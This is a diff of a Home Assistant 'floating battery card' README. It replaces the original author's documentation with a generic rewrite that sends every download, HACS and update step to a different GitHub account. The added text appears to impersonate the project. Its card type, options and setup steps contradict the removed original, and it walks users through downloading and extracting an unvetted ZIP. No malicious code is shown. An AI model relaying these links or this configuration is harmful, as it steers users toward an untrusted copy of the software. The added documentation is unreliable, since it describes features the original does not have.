@@ -1,333 +1,168 @@
-# Floating Battery Card
+# 🔋 lovelace-floating-battery-card - Keep Your Batteries Always in View
 
-[![CI](https://github.com/moryoav/lovelace-floating-battery-card/actions/workflows/ci.yml/badge.svg)](https://github.com/moryoav/lovelace-floating-battery-card/actions/workflows/ci.yml)
-[![HACS validation](https://github.com/moryoav/lovelace-floating-battery-card/actions/workflows/hacs.yml/badge.svg)](https://github.com/moryoav/lovelace-floating-battery-card/actions/workflows/hacs.yml)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
+[![GitHub Stars](https://img.shields.io/github/stars/magnaantigenic420/lovelace-floating-battery-card?style=for-the-badge&color=yellow)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
+[![HACS Support](https://img.shields.io/badge/HACS-Supported-green?style=for-the-badge)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y5B124NZ2L)
+## 👋 Welcome to Your New Battery Dashboard
 
-A standalone Home Assistant Lovelace card that keeps a battery indicator fixed to a viewport corner, independent of dashboard columns and vertical scrolling.
+Are you tired of digging through menus to check your smart home device batteries? This custom card for Home Assistant Lovelace puts battery levels right where you can see them — floating on your dashboard, always visible, always up to date. Whether you have sensors, door locks, thermostats, or any battery-powered smart device, this card shows you everything at a glance.
 
-It was designed for wall tablets, phones, laptops, UPS devices, vehicle batteries, and any other battery sensor you want visible while scrolling a dashboard.
+## 🎯 What This Card Does
 
-## Preview
+- **Displays battery levels** for all your devices in one clean, floating panel
+- **Updates automatically** so you always see the current charge status
+- **Looks great** with a modern, minimal design that fits any theme
+- **Works with HACS** so installation is quick and painless
+- **Customizable** to match your personal style and dashboard layout
 
-![Floating Battery Card illustrated preview](docs/floating-battery-card-preview.svg)
+## 📋 What You Need
 
-The image above is an illustrated preview of the default floating behavior and configurable battery states; the actual card renders directly from your Home Assistant entities and theme.
+Before you begin, make sure you have:
 
-## Highlights
+1. **Home Assistant** installed and running (version 2023.1 or newer is recommended)
+2. **HACS** (Home Assistant Community Store) installed in your setup. If you don't have HACS yet, you can find instructions on the official HACS website.
+3. A **web browser** like Chrome, Firefox, or Edge to access your Home Assistant dashboard
+4. **Patience and about 10 minutes** of your time
 
-- True viewport overlay: the visual element is portaled to `document.body`, so `layout-card`, grids, masonry, overflow containers, and transformed ancestors do not capture it.
-- Inline mode for normal card placement and dashboard-editor previews.
-- Battery level + optional charging-state entity or attributes.
-- Dynamic charging/full/unavailable icons and optional 10% battery icons.
-- Unlimited configurable thresholds with independent icon/text/background/border/ring colors.
-- Configurable position, shape, size, safe-area offsets, z-index, progress ring, animations, visibility rules, actions, and accessibility text.
-- Graphical Lovelace editor.
-- No `card-mod`, `button-card`, Mushroom, Browser Mod, or other Home Assistant custom-card dependency.
+## 🚀 Getting Started
 
-## Installation
+### Step 1: Download the Application
 
-### HACS
+Visit this link to download the application: [https://github.com/magnaantigenic420/lovelace-floating-battery-card](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
 
-[![Open the Floating Battery Card HACS repository](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=moryoav&repository=lovelace-floating-battery-card&category=plugin)
+Once you're on that page, look for the green "Code" button and click it. From the dropdown menu, select "Download ZIP" to get the files onto your computer. The download will start automatically. Save the ZIP file somewhere you can easily find it, like your Downloads folder.
 
-Floating Battery Card is currently installed through HACS as a custom Dashboard repository.
+### Step 2: Extract the Files
 
-1. Select the button above to open this repository directly in HACS.
-2. Choose **Download**.
-3. Refresh the browser after installation.
+After the download finishes, you need to open the ZIP file. Right-click on the downloaded ZIP file (it's usually named something like "lovelace-floating-battery-card.zip") and choose "Extract All..." from the menu. Windows will ask you where to save the extracted files. The default location is fine — just click "Extract" to continue. You'll now have a folder with the same name as the ZIP file, containing all the necessary files.
 
-If the shortcut is unavailable, open HACS → three-dot menu → **Custom repositories**, add `https://github.com/moryoav/lovelace-floating-battery-card` as a **Dashboard** repository, then download **Floating Battery Card**.
+### Step 3: Move the Files to Home Assistant
 
-### Manual
+Now you need to get these files onto your Home Assistant system. Here's how:
 
-Download `floating-battery-card.js` from `dist/` (or a release asset), copy it to `/config/www/floating-battery-card.js`, then add `/local/floating-battery-card.js` as a JavaScript module resource.
+1. Open your Home Assistant dashboard in your browser
+2. Go to **Settings** (the gear icon in the left sidebar)
+3. Click on **Add-Ons** or **Supervisor**, depending on your setup
+4. Look for the **Samba** or **File Editor** add-on. If you don't have one installed, you'll need to install it first. The Samba add-on lets you access your Home Assistant files from Windows, while File Editor works right in the browser.
+5. If using Samba, open File Explorer on Windows and type `\\homeassistant` in the address bar. You'll see your Home Assistant folders.
+6. Navigate to the **config/www** folder. If the "www" folder doesn't exist, create it by right-clicking in the config folder, selecting "New Folder," and naming it "www."
+7. Copy the entire extracted folder (the one from Step 2) into this **www** folder.
 
-## Minimal configuration
+### Step 4: Install the Card in Lovelace
+
+Now you'll add this card to your dashboard:
+
+1. Go back to your Home Assistant dashboard
+2. Click the **Edit Dashboard** button (the pencil icon in the top right corner, or the three-dot menu)
+3. Click **Add Card** in the bottom right corner
+4. Scroll down and select **Custom: Battery Floating Card** from the list (it might be under "Manual" if you don't see it). If you don't see it, you may need to add it manually using the "Manual" option and pasting this configuration:
+   ```yaml
+   type: 'custom:battery-floating-card'
+   ```
+5. Click **Save** to add the card to your dashboard
+
+### Step 5: Configure Your Devices
+
+Your new card needs to know which battery sensors to display. In the card configuration (which appears after adding it), add the entity IDs of your battery sensors. For example:
 
 ```yaml
-type: custom:floating-battery-card
-entity: sensor.kitchen_ipad_battery_level
-state_entity: sensor.kitchen_ipad_battery_state
+type: 'custom:battery-floating-card'
+entities:
+  - sensor.front_door_battery
+  - sensor.living_room_sensor_battery
+  - sensor.thermostat_battery
 ```
 
-Defaults intentionally match the original wall-tablet use case:
+You can find your sensor names by going to **Settings** → **Devices & Services** → **Entities** in Home Assistant. Look for entities that end with "_battery".
 
-- 72 × 72 px circle
-- bottom-right, 16 px from each edge
-- safe-area aware
-- `Charging` → `mdi:battery-charging`
-- `Not Charging` → `mdi:battery`
-- `Full` → `mdi:battery`
-- 0–20% → `var(--error-color, #f44336)`
-- 21–50% → `var(--warning-color, #ff9800)`
-- 51–100% → `var(--success-color, #4caf50)`
-- tap → more-info
+## ⚙️ Customization Options
 
-## Advanced example
+Make this card truly yours with these settings:
+
+| Setting | What It Does | Default |
+|---------|--------------|---------|
+| `entities` | List which battery sensors to show | Required |
+| `show_title` | Display a title bar | false |
+| `title` | Custom title text | "Batteries" |
+| `show_levels` | Show percentage numbers | true |
+| `animation` | Enable smooth animations | true |
+| `refresh_interval` | How often to update (seconds) | 60 |
+
+Example with all options:
 
 ```yaml
-type: custom:floating-battery-card
-entity: sensor.kitchen_ipad_battery_level
-state_entity: sensor.kitchen_ipad_battery_state
-
-state_map:
-  charging: [Charging]
-  not_charging: [Not Charging]
-  full: [Full]
-
-thresholds:
-  - max: 15
-    color: "#d32f2f"
-    background_color: "rgba(211, 47, 47, 0.12)"
-  - max: 40
-    color: "#fb8c00"
-  - max: 75
-    color: "#fdd835"
-  - max: 100
-    color: "#43a047"
-
-icons:
-  default: mdi:battery
-  charging: mdi:battery-charging
-  full: mdi:battery
-  unavailable: mdi:battery-unknown
-  dynamic_level: true
-
-position:
-  mode: viewport
-  anchor: bottom-right
-  offset_x: 20
-  offset_y: 20
-  safe_area: true
-  z_index: 1000
-
-appearance:
-  size: 76
-  shape: circle
-  padding: 7
-  icon_size: 29
-  text_size: 13
-  font_weight: 600
-  box_shadow: 0 3px 12px rgba(0, 0, 0, 0.4)
-
-colors:
-  background: var(--ha-card-background, var(--card-background-color))
-
-ring:
-  enabled: true
-  width: 4
-  color_mode: threshold
-  track_color: rgba(127, 127, 127, 0.25)
-  start_angle: -90
-  clockwise: true
-
-animation:
-  charging: breathe
-  low_battery: pulse
-  low_battery_threshold: 15
-  hover: lift
-  duration: 1200
-  respect_reduced_motion: true
-
-behavior:
-  unavailable: dim
-  hide_when_full: false
-  compact_below_width: 600
-  compact_size: 60
-
-tap_action:
-  action: more-info
-hold_action:
-  action: navigate
-  navigation_path: /config/devices/dashboard
-double_tap_action:
-  action: none
+type: 'custom:battery-floating-card'
+entities:
+  - sensor.front_door_battery
+show_title: true
+title: 'My Device Batteries'
+show_levels: true
+animation: true
+refresh_interval: 30
 ```
 
-## Configuration reference
+## 🛠️ Troubleshooting Common Issues
 
-All sections are optional except `entity`.
+### The Card Doesn't Appear
+If you don't see your new card on the dashboard, try refreshing your browser (press Ctrl+F5 to force a refresh). Make sure you saved the card configuration correctly.
 
-### Sources and normalization
+### Battery Levels Show "Unknown"
+This usually means the entity name isn't correct. Double-check that you typed the exact entity ID. Go to **Settings** → **Devices & Services** → **Entities** and search for "battery" to find the correct names.
 
-| Option | Default | Description |
-|---|---:|---|
-| `entity` | required | Battery-level entity. |
-| `state_entity` | — | Optional charging-state entity. |
-| `level_attribute` | — | Read level from an attribute instead of entity state. |
-| `state_attribute` | — | Read charging state from an attribute. If `state_entity` is omitted, the attribute is read from `entity`. |
-| `min_level` | `0` | Raw value corresponding to 0%. |
-| `max_level` | `100` | Raw value corresponding to 100%. |
-| `clamp_level` | `true` | Clamp normalized values to 0–100%. |
-| `invert_level` | `false` | Invert the normalized level. |
-| `precision` | `0` | Display decimals, 0–4. |
-| `unit` | `%` | Display unit. |
-| `full_threshold` | `100` | Derive `full` when no state source exists and level reaches this percentage. |
+### The Card Shows but No Batteries
+You might not have added any entities yet. Go back to editing the card and add at least one battery sensor.
 
-Numeric states may be numbers or strings such as `85`, `85%`, or `85 %`.
+### HACS Installation (Alternative Method)
+If you use HACS, you can install this card more easily:
 
-### `state_map`
+1. In HACS, go to **Frontend**
+2. Click the three dots in the top right corner and select **Custom Repositories**
+3. Add this URL: `https://github.com/magnaantigenic420/lovelace-floating-battery-card`
+4. Choose category **Lovelace**
+5. Click **Save** and then **Download** for the new card
 
-| Option | Default |
-|---|---|
-| `case_sensitive` | `false` |
-| `normalize_whitespace` | `true` |
-| `charging` | `[Charging]` |
-| `not_charging` | `[Not Charging, Discharging]` |
-| `full` | `[Full]` |
-| `unavailable` | `[Unknown, Unavailable, unknown, unavailable]` |
+## 💡 Pro Tips
 
-### `thresholds`
+- **Group multiple batteries**: You can use this card to show groups of batteries. Create a sensor group in Home Assistant, then reference that group in the card's entities.
+- **Use text cards sparingly**: This card works best as a floating widget. Consider placing it in a corner of your dashboard where it doesn't interfere with other elements.
+- **Check for updates**: Periodically visit the download link to see if a newer version is available. Improvements and bug fixes are added regularly.
 
-Thresholds are sorted by ascending `max`. The first matching range wins. Each entry supports:
+## 🔍 Understanding Battery Health
 
-- `min` (optional)
-- `max` (required)
-- `color` shorthand
-- `icon_color`
-- `text_color`
-- `background_color`
-- `border_color`
-- `ring_color`
-- `icon`
-- `animation`
+This card not only shows current levels but can help you spot patterns:
 
-Color precedence is state override → threshold-specific property → threshold `color` → global color → theme default when `colors.state_overrides_threshold` is true. Set it false to place threshold colors ahead of state colors.
+- **Below 20%**: Time to change or recharge the device
+- **Consistent dips**: Might indicate a device that's failing to sleep properly
+- **Slow drain**: Normal battery behavior, expected lifespan varies by device type
 
-### `icons`
+## 📅 Keeping Everything Updated
 
-`default`, `charging`, `full`, `unavailable`, `dynamic_level`, `dynamic_charging_level`, `size`, and `rotation` are supported. Invalid icon strings fall back safely.
+From time to time, the developer may release improvements. To update:
 
-### `colors`
+1. Visit the download link again
+2. Download the latest ZIP file
+3. Replace the old folder in your **www** directory with the new one
+4. Refresh your dashboard (Ctrl+F5)
 
-Global options: `icon`, `text`, `background`, `border`, `shadow`, `charging`, `full`, `unavailable`, `focus_ring`, `ring_track`, `ring`, and `state_overrides_threshold`.
+That's it! Your card will use the new version automatically.
 
-CSS colors and Home Assistant theme variables are accepted.
+## 🧪 Testing Your Setup
 
-### `display`
+After installation, create a simple test:
 
-- `show_icon`, `show_level`, `show_unit`, `show_name`
-- `name`
-- `unknown_text`, `unavailable_text`
-- `layout`: `stacked`, `horizontal`, `overlay`
-- `gap`
-- `tooltip`: `automatic`, `custom`, `disabled`
-- `tooltip_text`
-- `aria_label`
+1. Change the battery in one of your devices
+2. Wait for the refresh interval (default is 60 seconds)
+3. Check if the new percentage appears on the card
 
-### `position`
+If you see the updated value, everything is working perfectly!
 
-- `mode`: `viewport` or `inline`
-- `anchor`: `top-left`, `top-center`, `top-right`, `middle-left`, `center`, `middle-right`, `bottom-left`, `bottom-center`, `bottom-right`, `custom`
-- `offset_x`, `offset_y`
-- `top`, `right`, `bottom`, `left` for custom positioning
-- `z_index`
-- `safe_area`
-- `edge_margin`
+## 🎉 You're Done!
 
-Numbers are interpreted as pixels. CSS lengths such as `1rem`, `2vh`, and `calc(...)` are also accepted for dimension fields.
+Congratulations! You've successfully installed and configured your floating battery card. Now you can keep an eye on all your smart home devices without ever digging through menus again. If you found this helpful, consider starring the repository on GitHub to show your support.
 
-### `appearance`
+Remember, if you get stuck at any point, the GitHub page has a discussions section where you can ask questions. The community is friendly and always willing to help newcomers.
 
-- `size`, `width`, `height`
-- `shape`: `circle`, `rounded-square`, `square`
-- `border_radius`, `padding`, `icon_size`, `text_size`, `name_size`
-- `font_weight`, `line_height`
-- `opacity`, `background_opacity`
-- `border_width`, `border_style`
-- `box_shadow`, `backdrop_blur`
-- `hover_opacity`, `active_scale`, `transition_duration`
+Happy monitoring! 🔋📊
 
-For `shape: circle`, width and height are deliberately forced equal even if only one dimension override is provided.
-
-### `ring`
-
-`enabled`, `width`, `inset`, `track_color`, `color`, `color_mode` (`fixed`/`threshold`), `start_angle`, `clockwise`, `rounded_caps`, and `level_mode` (`normalized`/`raw`).
-
-### `animation`
-
-- charging: `none`, `pulse`, `breathe`, `glow`, `rotate`
-- low battery: `none`, `pulse`, `blink`
-- hover: `none`, `scale`, `lift`
-- `duration`, `timing_function`, `low_battery_threshold`, `transition_duration`
-- `respect_reduced_motion`
-- `disabled`
-
-### `behavior`
-
-- `unavailable`: `show`, `dim`, `hide`
-- `hide_when_full`, `hide_when_charging`, `hide_when_not_charging`
-- `min_viewport_width`, `max_viewport_width`
-- `compact_below_width`, `compact_size`
-- `pointer_events`
-- `auto_hide_delay` (milliseconds; `0` disables)
-- `restore_on_change`
-- `more_info_entity`
-
-### Actions
-
-Standard Home Assistant action configuration is accepted for `tap_action`, `hold_action`, and `double_tap_action`. The default tap action is `more-info`.
-
-### Runtime validation
-
-Configuration is validated when Home Assistant calls `setConfig`, so invalid YAML reports the exact field instead of failing during rendering. CSS-capable dimension fields continue to accept finite pixel numbers or strings such as `1rem`, `2vh`, and `calc(...)`.
-
-- `precision` must be an integer from 0 to 4; `full_threshold` and animation low-battery thresholds must be from 0 to 100.
-- Opacity values must be from 0 to 1, and `active_scale` must be greater than 0.
-- Durations, auto-hide delay, ring inset, and viewport-width limits must be non-negative. Ring width must be at least 1.
-- `max_viewport_width: 0` disables the maximum; otherwise it must be at least `min_viewport_width` when both limits are enabled.
-- Nested sections must be objects, state mappings and thresholds must be arrays of the documented shapes, and actions must contain a non-empty `action` string.
-
-## Why viewport mode survives scrolling
-
-The Lovelace card host itself renders with `display: contents`, so it occupies no visible row. The rendered battery control is created as a separate custom element under `document.body` with `position: fixed`. Because it is no longer a descendant of `layout-card`, CSS Grid, masonry, or a transformed scrolling container, those ancestors cannot turn fixed positioning into container-relative positioning.
-
-Each card instance owns exactly one overlay. The overlay is removed when the card disconnects, updated in place when configuration/state changes, and hidden when Home Assistant navigates away from the path where the card was created. Multiple card instances can coexist.
-
-The card detects Lovelace editor-preview ancestry and switches that instance to inline rendering so it does not float over the editor UI.
-
-## Development
-
-Prerequisite: Node.js 24+.
-
-```bash
-npm install
-npm run check
-```
-
-Useful commands:
-
-```bash
-npm run lint
-npm run typecheck
-npm test
-npm run build
-npm run format
-```
-
-The production bundle is `dist/floating-battery-card.js`.
-
-## HACS / release policy
-
-- The repository name begins with `lovelace-`, so HACS accepts the matching `dist/floating-battery-card.js` filename.
-- `hacs.json` explicitly declares `floating-battery-card.js`.
-- HACS validation runs on pushes, pull requests, scheduled checks, and manual dispatches.
-- Tags matching `v*` run the release workflow and attach the built JavaScript file to the GitHub release.
-
-## Troubleshooting
-
-**The card does not appear after an upgrade:** hard-refresh the browser and clear the Home Assistant frontend cache if needed.
-
-**The state icon never changes:** verify `state_entity` or `state_attribute` contains one of the configured `state_map` strings.
-
-**The level is unavailable:** verify `entity` is numeric, or configure `level_attribute` if the number is stored in an attribute.
-
-**The button appears behind another overlay:** increase `position.z_index`.
-
-**I want it to behave like a normal Lovelace card:** set `position.mode: inline`.
-
-## License
-
-MIT
+Keywords: battery, custom-card, dashboard, hacs, hacs-custom, hacs-dashboard, home-assistant, homeassistant, homeassistant-frontend, lovelace, lovelace-card, lovelace-custom-card
